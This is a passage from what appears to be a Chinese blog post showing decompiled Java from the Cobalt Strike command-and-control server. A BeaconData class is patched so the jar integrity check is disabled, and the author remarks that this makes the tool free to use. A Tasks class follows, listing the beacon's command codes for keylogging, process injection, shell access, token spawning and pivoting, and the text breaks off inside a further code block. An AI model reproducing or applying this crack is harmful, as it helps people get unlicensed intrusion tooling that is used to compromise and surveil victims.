&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> beacon;<br><br><span class="hljs-keyword">import</span> common.CommonUtils;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Iterator;<br><span class="hljs-keyword">import</span> java.util.LinkedList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BeaconData</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> MODE_HTTP = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> MODE_DNS = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> MODE_DNS_TXT = <span class="hljs-number">2</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> MODE_DNS6 = <span class="hljs-number">3</span>;<br>   <span class="hljs-keyword">protected</span> Map queues = <span class="hljs-keyword">new</span> HashMap();<br>   <span class="hljs-keyword">protected</span> Map modes = <span class="hljs-keyword">new</span> HashMap();<br>   <span class="hljs-keyword">protected</span> Set tasked = <span class="hljs-keyword">new</span> HashSet();<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">boolean</span> shouldPad = <span class="hljs-keyword">false</span>;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">long</span> when = <span class="hljs-number">0L</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">protected</span> List <span class="hljs-title">getQueue</span><span class="hljs-params">(String var1)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.queues.containsKey(var1)) &#123;<br>            <span class="hljs-keyword">return</span> (List)<span class="hljs-keyword">this</span>.queues.get(var1);<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            LinkedList var3 = <span class="hljs-keyword">new</span> LinkedList();<br>            <span class="hljs-keyword">this</span>.queues.put(var1, var3);<br>            <span class="hljs-keyword">return</span> var3;<br>         &#125;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isNewSession</span><span class="hljs-params">(String var1)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         <span class="hljs-keyword">return</span> !<span class="hljs-keyword">this</span>.tasked.contains(var1);<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">virgin</span><span class="hljs-params">(String var1)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         <span class="hljs-keyword">this</span>.tasked.remove(var1);<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">shouldPad</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> var1)</span> </span>&#123;<br>      <span class="hljs-keyword">this</span>.shouldPad = <span class="hljs-keyword">false</span>; <span class="hljs-comment">// 修改这里为false，不校验jar包完整性</span><br>      <span class="hljs-keyword">this</span>.when = System.currentTimeMillis() + <span class="hljs-number">1800000L</span>;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">task</span><span class="hljs-params">(String var1, <span class="hljs-keyword">byte</span>[] var2)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         List var4 = <span class="hljs-keyword">this</span>.getQueue(var1);<br>         <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.shouldPad &amp;&amp; System.currentTimeMillis() &gt; <span class="hljs-keyword">this</span>.when) &#123;<br>            CommandBuilder var5 = <span class="hljs-keyword">new</span> CommandBuilder();<br>            var5.setCommand(<span class="hljs-number">3</span>);<br>            var5.addString(var2);<br>            var4.add(var5.build());<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            var4.add(var2);<br>         &#125;<br><br>         <span class="hljs-keyword">this</span>.tasked.add(var1);<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">seen</span><span class="hljs-params">(String var1)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         <span class="hljs-keyword">this</span>.tasked.add(var1);<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(String var1)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         List var3 = <span class="hljs-keyword">this</span>.getQueue(var1);<br>         var3.clear();<br>         <span class="hljs-keyword">this</span>.tasked.add(var1);<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMode</span><span class="hljs-params">(String var1)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         String var3 = (String)<span class="hljs-keyword">this</span>.modes.get(var1);<br>         <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;dns-txt&quot;</span>.equals(var3)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>         &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;dns6&quot;</span>.equals(var3)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;dns&quot;</span>.equals(var3) ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>;<br>         &#125;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mode</span><span class="hljs-params">(String var1, String var2)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         <span class="hljs-keyword">this</span>.modes.put(var1, var2);<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasTask</span><span class="hljs-params">(String var1)</span> </span>&#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         List var3 = <span class="hljs-keyword">this</span>.getQueue(var1);<br>         <span class="hljs-keyword">return</span> var3.size() &gt; <span class="hljs-number">0</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] dump(String var1, <span class="hljs-keyword">int</span> var2) &#123;<br>      <span class="hljs-keyword">synchronized</span>(<span class="hljs-keyword">this</span>) &#123;<br>         <span class="hljs-keyword">int</span> var4 = <span class="hljs-number">0</span>;<br>         List var5 = <span class="hljs-keyword">this</span>.getQueue(var1);<br>         <span class="hljs-keyword">if</span> (var5.size() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">0</span>];<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            ByteArrayOutputStream var6 = <span class="hljs-keyword">new</span> ByteArrayOutputStream(<span class="hljs-number">8192</span>);<br>            Iterator var7 = var5.iterator();<br><br>            <span class="hljs-keyword">while</span>(var7.hasNext()) &#123;<br>               <span class="hljs-keyword">byte</span>[] var8 = (<span class="hljs-keyword">byte</span>[])((<span class="hljs-keyword">byte</span>[])var7.next());<br>               <span class="hljs-keyword">if</span> (var4 + var8.length &lt; var2) &#123;<br>                  var6.write(var8, <span class="hljs-number">0</span>, var8.length);<br>                  var7.remove();<br>                  var4 += var8.length;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                  <span class="hljs-keyword">if</span> (var8.length &lt; var2) &#123;<br>                     CommonUtils.print_warn(<span class="hljs-string">&quot;Chunking tasks for &quot;</span> + var1 + <span class="hljs-string">&quot;! &quot;</span> + var8.length + <span class="hljs-string">&quot; + &quot;</span> + var4 + <span class="hljs-string">&quot; past threshold. &quot;</span> + var5.size() + <span class="hljs-string">&quot; task(s) on hold until next checkin.&quot;</span>);<br>                     <span class="hljs-keyword">break</span>;<br>                  &#125;<br><br>                  CommonUtils.print_error(<span class="hljs-string">&quot;Woah! Task &quot;</span> + var8.length + <span class="hljs-string">&quot; for &quot;</span> + var1 + <span class="hljs-string">&quot; is beyond our limit. Dropping it&quot;</span>);<br>                  var7.remove();<br>               &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var6.toByteArray();<br>         &#125;<br>      &#125;<br>   &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>搞完这些，就可以白嫖了。</p><p>beacon/Tasks 定义命令编号   beacon/Job 定义beacon端返回模块执行结果编号</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> beacon;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tasks</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWN = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SHELL = <span class="hljs-number">2</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_DIE = <span class="hljs-number">3</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SLEEP = <span class="hljs-number">4</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_CD = <span class="hljs-number">5</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_KEYLOG_START = <span class="hljs-number">6</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_KEYLOG_STOP = <span class="hljs-number">7</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INJECT_PID = <span class="hljs-number">9</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INJECT_PING = <span class="hljs-number">18</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_UPLOAD = <span class="hljs-number">10</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWN_PROC_X86 = <span class="hljs-number">13</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_JOB_REGISTER = <span class="hljs-number">40</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INJECTX64_PID = <span class="hljs-number">43</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWNX64 = <span class="hljs-number">44</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_LSOCKET_BIND = <span class="hljs-number">50</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_LSOCKET_CLOSE = <span class="hljs-number">51</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_JOB_REGISTER_IMPERSONATE = <span class="hljs-number">62</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWN_POWERSHELLX86 = <span class="hljs-number">63</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWN_POWERSHELLX64 = <span class="hljs-number">64</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INJECT_POWERSHELLX86_PID = <span class="hljs-number">65</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INJECT_POWERSHELLX64_PID = <span class="hljs-number">66</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_UPLOAD_CONTINUE = <span class="hljs-number">67</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_PIPE_OPEN_EXPLICIT = <span class="hljs-number">68</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWN_PROC_X64 = <span class="hljs-number">69</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_JOB_SPAWN_X86 = <span class="hljs-number">70</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_JOB_SPAWN_X64 = <span class="hljs-number">71</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SETENV = <span class="hljs-number">72</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_FILE_COPY = <span class="hljs-number">73</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_FILE_MOVE = <span class="hljs-number">74</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_PPID = <span class="hljs-number">75</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_RUN_UNDER_PID = <span class="hljs-number">76</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_GETPRIVS = <span class="hljs-number">77</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_EXECUTE_JOB = <span class="hljs-number">78</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_PSH_HOST_TCP = <span class="hljs-number">79</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_DLL_LOAD = <span class="hljs-number">80</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_REG_QUERY = <span class="hljs-number">81</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_LSOCKET_TCPPIVOT = <span class="hljs-number">82</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_ARGUE_ADD = <span class="hljs-number">83</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_ARGUE_REMOVE = <span class="hljs-number">84</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_ARGUE_LIST = <span class="hljs-number">85</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_TCP_CONNECT = <span class="hljs-number">86</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_JOB_SPAWN_TOKEN_X86 = <span class="hljs-number">87</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_JOB_SPAWN_TOKEN_X64 = <span class="hljs-number">88</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWN_TOKEN_X86 = <span class="hljs-number">89</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWN_TOKEN_X64 = <span class="hljs-number">90</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INJECTX64_PING = <span class="hljs-number">91</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_BLOCKDLLS = <span class="hljs-number">92</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWNAS_X86 = <span class="hljs-number">93</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWNAS_X64 = <span class="hljs-number">94</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INLINE_EXECUTE = <span class="hljs-number">95</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_RUN_INJECT_X86 = <span class="hljs-number">96</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_RUN_INJECT_X64 = <span class="hljs-number">97</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWNU_X86 = <span class="hljs-number">98</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_SPAWNU_X64 = <span class="hljs-number">99</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_INLINE_EXECUTE_OBJECT = <span class="hljs-number">100</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_JOB_REGISTER_MSGMODE = <span class="hljs-number">101</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> COMMAND_LSOCKET_BIND_LOCALHOST = <span class="hljs-number">102</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div 